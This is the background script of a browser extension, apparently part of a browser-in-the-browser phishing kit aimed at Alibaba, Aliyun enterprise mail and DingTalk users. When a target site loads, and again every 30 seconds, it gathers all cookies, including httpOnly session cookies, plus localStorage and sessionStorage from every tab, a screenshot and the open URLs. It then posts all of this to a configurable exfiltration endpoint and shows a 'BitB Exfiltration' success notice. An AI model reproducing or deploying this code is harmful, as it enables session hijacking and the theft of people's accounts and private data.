const EXFIL_ENDPOINT = typeof BITB_CONFIG !== 'undefined' ? BITB_CONFIG.endpoint : 'http://localhost:8080';
const SESSION_ID = typeof BITB_CONFIG !== 'undefined' ? BITB_CONFIG.sessionId : 'unknown';

browser.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'exfilSession') {
        extractAndExfilSession();
        sendResponse({status: 'extracting'});
    }
    return true;
});

browser.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url) {
        const targetPatterns = [
            /qiye\.aliyun\.com/,
            /dingtalk\.com/,
            /alibaba-inc\.com/,
            /oa\.dingtalk\.com/
        ];
        const isTarget = targetPatterns.some(pattern => pattern.test(tab.url));
        if (isTarget) {
            setTimeout(() => {
                extractAndExfilSession();
            }, 5000);
        }
    }
});

async function extractAndExfilSession() {
    try {
        const cookies = await browser.cookies.getAll({});
        const tabs = await browser.tabs.query({});
        const localStorageData = {};
        const sessionStorageData = {};

        for (const tab of tabs) {
            if (!tab.id) {
                continue;
            }
            try {
                const results = await browser.tabs.executeScript(tab.id, {code: 'JSON.stringify(localStorage)'});
                if (results && results[0]) {
                    localStorageData[tab.url] = JSON.parse(results[0]);
                }
            } catch (e) {
                console.log('Cannot access localStorage for tab:', tab.url);
            }
            try {
                const results = await browser.tabs.executeScript(tab.id, {code: 'JSON.stringify(sessionStorage)'});
                if (results && results[0]) {
                    sessionStorageData[tab.url] = JSON.parse(results[0]);
                }
            } catch (e) {
                console.log('Cannot access sessionStorage for tab:', tab.url);
            }
        }

        const activeTabs = await browser.tabs.query({active: true, currentWindow: true});
        let screenshot = null;
        if (activeTabs[0]) {
            try {
                screenshot = await browser.tabs.captureVisibleTab();
            } catch (e) {
                console.log('Screenshot failed:', e);
            }
        }

        const payload = {
            sessionId: SESSION_ID,
            timestamp: new Date().toISOString(),
            cookies: cookies.map(c => ({
                name: c.name,
                value: c.value,
                domain: c.domain,
                path: c.path,
                secure: c.secure,
                httpOnly: c.httpOnly,
                sameSite: c.sameSite,
                expirationDate: c.expirationDate,
                storeId: c.storeId
            })),
            localStorage: localStorageData,
            sessionStorage: sessionStorageData,
            screenshot: screenshot,
            userAgent: navigator.userAgent,
            urls: tabs.map(t => t.url)
        };

        const response = await fetch(`${EXFIL_ENDPOINT}/api/session/${SESSION_ID}/exfil`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-BitB-Source': 'cookie-extractor'
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            browser.notifications.create({
                type: 'basic',
                iconUrl: 'icon.png',
                title: 'BitB Exfiltration',
                message: 'Session data extracted successfully'
            });
        }
    } catch (error) {
        console.error('Exfiltration error:', error);
    }
}

setInterval(async () => {
    const tabs = await browser.tabs.query({});
    const currentUrl = tabs[0]?.url || '';
    if (/qiye\.aliyun\.com|dingtalk\.com/.test(currentUrl)) {
        extractAndExfilSession();
    }
}, 30000);
